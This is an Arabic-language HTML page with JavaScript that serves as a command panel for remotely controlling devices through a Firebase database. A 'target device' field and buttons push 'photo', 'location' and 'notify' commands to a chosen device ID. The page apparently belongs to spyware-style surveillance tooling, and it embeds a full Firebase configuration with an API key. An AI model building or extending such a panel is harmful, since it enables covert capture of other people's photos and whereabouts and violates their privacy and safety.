<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة التحكم</title>
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family: system-ui; }
    body { background: #0b0e14; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
    .container { max-width: 500px; width: 100%; background: #1a1f2b; padding: 24px; border-radius: 24px; }
    h1 { color: #00e5ff; margin-bottom: 16px; }
    .input-group { margin-bottom: 16px; }
    label { color: #b0c4de; font-size: 14px; }
    input { width: 100%; padding: 10px; border-radius: 10px; border: none; background: #262d3d; color: #fff; margin-top: 4px; }
    .btn { background: #00e5ff; color: #0b0e14; border: none; padding: 12px; border-radius: 12px; font-weight: bold; width: 100%; margin-top: 8px; cursor: pointer; }
    .btn-danger { background: #ff4d6d; color: #fff; }
    .row { display: flex; gap: 8px; }
    .row .btn { flex:1; }
    #status { margin-top:16px; color:#9aa0b0; font-size:14px; }
  </style>
</head>
<body>
<div class="container">
  <h1>🎮 لوحة التحكم</h1>
  <div class="input-group">
    <label>🔑 معرف الجهاز المستهدف</label>
    <input type="text" id="targetDevice" placeholder="مثال: dev_abc123" value="dev_">
  </div>
  <button class="btn" id="cmdPhoto">📸 التقط صورة</button>
  <button class="btn" id="cmdLocation">📍 احصل على الموقع</button>
  <button class="btn" id="cmdNotify">🔔 أرسل إشعار</button>
  <div class="row">
    <button class="btn btn-danger" id="cmdClear">مسح الأوامر</button>
  </div>
  <div id="status">⏳ جاهز</div>
</div>

<script>
  // ======== إعدادات Firebase (تم استبدالها بالبيانات الصحيحة) ========
  const firebaseConfig = {
    apiKey: "AIzaSyCNEYRJqQSQmOW83G9iaW1m4HBgSt8ANSM",
    authDomain: "remotecontrolpro-55cc6.firebaseapp.com",
    databaseURL: "https://remotecontrolpro-55cc6-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "remotecontrolpro-55cc6",
    storageBucket: "remotecontrolpro-55cc6.firebasestorage.app",
    messagingSenderId: "363977407926",
    appId: "1:363977407926:web:fd55ff9c3741c7a7a45517"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  function sendCommand(type) {
    const deviceId = document.getElementById('targetDevice').value.trim();
    if (!deviceId) { document.getElementById('status').textContent = '❌ أدخل معرف الجهاز'; return; }
    db.ref('commands/' + deviceId).push({ type, time: Date.now() });
    document.getElementById('status').textContent = '✅ أُرسل الأمر: ' + type + ' إلى ' + deviceId;
  }

  document.getElementById('cmdPhoto').onclick = () => sendCommand('photo');
  document.getElementById('cmdLocation').onclick = () => sendCommand('location');
  document.getElementById('cmdNotify').onclick = () => sendCommand('notify');
  document.getElementById('cmdClear').onclick = () => {
    const deviceId = document.getElementById('targetDevice').value.trim();
    if (deviceId && confirm('مسح أوامر ' + deviceId + '؟')) {
      db.ref('commands/' + deviceId).remove();
      document.getElementById('status').textContent = '🗑️ تم المسح';
    }
  };
</script>
</body>
</html>
